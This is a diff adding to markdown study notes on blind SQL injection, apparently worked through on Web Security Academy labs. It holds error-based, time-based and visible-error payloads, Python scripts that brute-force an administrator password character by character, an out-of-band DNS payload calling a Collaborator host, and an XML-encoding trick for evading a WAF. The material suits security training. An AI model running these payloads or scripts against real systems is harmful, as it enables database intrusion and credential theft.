@@ -382,9 +382,225 @@ These inputs use the **CASE** keyword to test a condition and return a different
 If the error causes a difference in the application's HTTP response, you can use this to determine whether the injected condition is true.
 
 Using this technique, you can retrieve data by testing one character at a time:
+```
+xyz' AND (SELECT CASE WHEN 
+(Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') 
+THEN 1/0 ELSE 'a' END FROM Users)='a
+```
 
-`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
+### Explanation of Components:
+
+1. `xyz' AND:`
+    - This starts the injection by ending the current query or statement (with the single quote) and appending the logical `AND` condition.
+
+2. `(SELECT CASE WHEN (...) THEN 1/0 ELSE 'a' END FROM Users):`
+    - This is a subquery with a `CASE` statement:
+        - `CASE WHEN:` Evaluates a condition.
+        - `THEN 1/0:` If the condition is `TRUE`, a divide-by-zero error is triggered.
+        - `ELSE 'a':` If the condition is `FALSE`, it returns the value `'a'`, avoiding an error.
+
+3. `(Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm'):`
+    - `Username = 'Administrator':` Targets the row where the username is `Administrator`.
+    - `SUBSTRING(Password, 1, 1):` Extracts the first character of the password.
+    - `> 'm':` Compares the first character of the password to `'m'` in ASCII order.
+
+4. `FROM Users:`
+    - Specifies the table (`Users`) where the query operates.
+
+5. `='a':`
+    - The result of the `CASE` statement is compared to `'a'`.
+    - If the condition is `FALSE`, the query executes without errors, and the response remains normal.
+    - If the condition is `TRUE`, a divide-by-zero error occurs, and the application's response changes.
+
 
 ### Lab: Blind SQL injection with conditional errors
 
 To solve the lab, log in as the administrator user. 
+
+Solution:
+
+1. Test with `TrackingId=xyz'`, an error apear
+2. Confirm that the server is interpreting the injection as a SQL query `TrackingId=xyz'||(SELECT '')||'`, noticed that the response is valid.
+3. Guess database name, for example:
+
+| Database   | Metadata Table/Schema          | Example Query                                                               |
+|-----------------|------------------------------------|---------------------------------------------------------------------------------|
+| Oracle      | DUAL, ALL_TABLES              | SELECT 'Test' FROM DUAL;                                                     |
+| MySQL       | information_schema.TABLES       | SELECT * FROM information_schema.TABLES;                                     |
+| PostgreSQL  | pg_catalog.pg_tables            | SELECT * FROM pg_catalog.pg_tables WHERE schemaname = 'public';              |
+| SQL Server  | sys.tables or INFORMATION_SCHEMA.TABLES | SELECT * FROM sys.tables;                                             |
+| SQLite      | sqlite_master                   | SELECT name, type FROM sqlite_master WHERE type = 'table';                   |
+| MariaDB     | information_schema.TABLES       | SELECT * FROM information_schema.TABLES;                                     |
+| IBM Db2     | SYSCAT.TABLES                   | SELECT * FROM SYSCAT.TABLES;                                                 |
+| Snowflake   | INFORMATION_SCHEMA.TABLES       | SELECT * FROM INFORMATION_SCHEMA.TABLES;                                  |
+
+Tested with `TrackingId=xyz'||(SELECT '' FROM dual)||'`, this indicates that the target is probably using an Oracle database, which requires all SELECT statements to explicitly specify a table name. 
+
+4. To verify that the users table exists, send the following query:
+
+`TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
+
+As this query does not return an error, you can infer that this table does exist. Note that the `WHERE ROWNUM = 1` condition is important here to prevent the query from returning more than one row, which would break our concatenation. 
+
+5. You can also exploit this behavior to test conditions. First, submit the following query:
+ 
+`TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
+
+Verify that an error message is received.
+Now change it to:
+
+`TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
+
+Verify that the error disappears. 
+
+6. You can use this behavior to test whether specific entries exist in a table. For example, use the following query to check whether the username administrator exists:
+
+`TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
+
+Verify that the condition is true (the error is received), confirming that there is a user called administrator.
+
+7. The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:
+
+`TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
+
+This condition should be true, confirming that the password is greater than 1 character in length.
+
+Send a series of follow-up values to test different password lengths. Send:
+
+`TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
+
+Then send:
+
+`TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
+
+And so on
+
+8.  The next step is to test the character at each position to determine its value.
+
+Go to Burp Intruder and change the value of the cookie to:
+
+`TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
+
+Then send:
+
+`TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
+
+Python script:
+```python
+import requests
+
+url = "https://0a41008404768dd38175bca9001700e7.web-security-academy.net/filter?category=Gifts"
+cookies = {"session": "qGFjPJIOkdDlqJPF9OApFEzoqknMBNHn", "TrackingId": "GL48PGItA4XoAQZS"}
+
+def checkPayLoad(payload):
+    cookiesPayload = cookies.copy()
+    cookiesPayload["TrackingId"] = cookiesPayload["TrackingId"] + payload
+    r = requests.get(url, cookies=cookiesPayload)
+    if 'Gifts' in r.text:
+        return False
+    else:  
+        return True
+    
+#checkPayLoad("'||(select '' from dual)||'")
+chars = "abcdefghijklmnopqrstuvwxyz0123456789-_"
+name = ""
+for pos in range(1, 21):
+    for char in chars:
+        if checkPayLoad(f"'||(select CASE when substr(password,{pos},1) = '{char}' THEN to_char(1/0) ELSE '' END from users where username = 'administrator')||'") == True:
+            print(f"Found char {char} at position {pos}")
+            name += char
+            break
+print(name)
+```
+
+### Lab: Visible error-based SQL injection
+
+`' and 1=cast((select 1) as int)--`
+
+`' and 1=cast((select username from users) as int)--`
+
+`' and 1=cast((select username from users limit 1) as int)--`
+
+`' and 1=cast((select password from users limit 1) as int)--`
+
+## Exploiting blind SQL injection by triggering time delays
+
+If the application catches database errors when the SQL query is executed and handles them gracefully, there won't be any difference in the application's response. This means the previous technique for inducing conditional errors will not work.
+
+In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays depending on whether an injected condition is true or false. As SQL queries are normally processed synchronously by the application, delaying the execution of a SQL query also delays the HTTP response. This allows you to determine the truth of the injected condition based on the time taken to receive the HTTP response.
+
+### Lab: Blind SQL injection with time delays and information retrieval
+
+`'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(2)+ELSE+pg_sleep(0)+END--;`
+
+`TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(2)+ELSE+pg_sleep(0)+END+FROM+users--`
+
+
+`TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
+
+```python
+import requests
+import time
+
+url = "https://0a44006a04d440c481eb1b6900d80042.web-security-academy.net/filter?category=Gifts"
+cookies = {
+    "TrackingId": "yunGCtJo2eYBUC6i",
+    "session": "mWuLYM4E8hgLjdJzUSvyb5t25jwlLE8t"
+}
+
+def getTime(payload):
+    cookies_payload = cookies.copy()
+    cookies_payload["TrackingId"] += payload
+    start_time = time.time()
+    response = requests.get(url, cookies=cookies_payload)
+    elapsed_time = time.time() - start_time
+    return elapsed_time
+
+def extractPassword():
+    extracted_password = ""
+    chars = "abcdefghijklmnopqrstuvwxyz0123456789-_"
+
+    for pos in range(1, 21):
+        for char in chars:
+            payload = f"'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{pos},1)='{char}')+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--"
+            time = getTime(payload)
+            if time > 1.5:
+                print(f"Found character '{char}' at position {pos}")
+                extracted_password += char
+                break
+    return extracted_password
+
+password = extractPassword()
+print(password)
+```
+
+## Exploiting blind SQL injection using out-of-band (OAST) techniques
+
+An application might carry out the same SQL query as the previous example but do it asynchronously. The application continues processing the user's request in the original thread, and uses another thread to execute a SQL query using the tracking cookie. The query is still vulnerable to SQL injection, but none of the techniques described so far will work. The application's response doesn't depend on the query returning any data, a database error occurring, or on the time taken to execute the query.
+
+In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control. These can be triggered based on an injected condition to infer information one piece at a time. More usefully, data can be exfiltrated directly within the network interaction.
+
+A variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service). Many production networks allow free egress of DNS queries, because they're essential for the normal operation of production systems.
+
+The easiest and most reliable tool for using out-of-band techniques is Burp Collaborator. This is a server that provides custom implementations of various network services, including DNS. It allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application. Burp Suite Professional includes a built-in client that's configured to work with Burp Collaborator right out of the box. For more information, see the documentation for Burp Collaborator.
+
+The techniques for triggering a DNS query are specific to the type of database being used. For example, the following input on Microsoft SQL Server can be used to cause a DNS lookup on a specified domain:
+'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
+
+This causes the database to perform a lookup for the following domain:
+0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
+
+You can use Burp Collaborator to generate a unique subdomain and poll the Collaborator server to confirm when any DNS lookups occur. 
+
+## SQL injection in different contexts
+
+In the previous labs, you used the query string to inject your malicious SQL payload. However, you can perform SQL injection attacks using any controllable input that is processed as a SQL query by the application. For example, some websites take input in JSON or XML format and use this to query the database.
+
+These different formats may provide different ways for you to obfuscate attacks that are otherwise blocked due to WAFs and other defense mechanisms. Weak implementations often look for common SQL injection keywords within the request, so you may be able to bypass these filters by encoding or escaping characters in the prohibited keywords. For example, the following XML-based SQL injection uses an XML escape sequence to encode the S character in SELECT:
+```html
+<stockCheck>
+    <productId>123</productId>
+    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
+</stockCheck>
+```
+This will be decoded server-side before being passed to the SQL interpreter.
